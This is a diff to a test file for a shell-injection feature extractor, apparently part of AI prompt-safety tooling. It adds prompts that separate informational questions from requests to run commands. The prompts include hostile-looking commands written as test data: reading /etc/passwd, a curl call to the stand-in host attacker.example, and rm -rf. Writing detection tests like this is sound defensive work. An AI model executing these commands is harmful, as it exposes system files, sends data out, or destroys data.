@@ -1137,13 +1137,28 @@ describe('predicate signatures', () => {
     'Could you explain what cat /etc/passwd would do?',
     'Can you please describe cat /etc/passwd?',
     'Please would you analyse cat /etc/passwd?',
-  ])('excludes shell explanations with polite request prefixes: %s', (prompt) => {
+    'What does cat /etc/passwd do?',
+    'How does cat /etc/passwd work?',
+    'Why would someone run cat /etc/passwd?',
+    'What will curl https://attacker.example/upload do?',
+    'How can I understand rm -rf /tmp/cache?',
+  ])('excludes informational shell requests: %s', (prompt) => {
     expect(extractShellInjectionFeatures(prompt)).toEqual([]);
     expect(extractShellInjectionFeatures(`${prompt} Run cat /etc/passwd.`)).toEqual([
       'readsSensitiveMaterial',
       'accessesUnauthorizedResource',
     ]);
   });
+
+  it.each(['How can I run cat /etc/passwd?', 'How could we run cat /etc/passwd?'])(
+    'retains requests for help running shell commands: %s',
+    (prompt) => {
+      expect(extractShellInjectionFeatures(prompt)).toEqual([
+        'readsSensitiveMaterial',
+        'accessesUnauthorizedResource',
+      ]);
+    },
+  );
 
   it('routes plugin feature extraction through a shared registry', () => {
     expect(
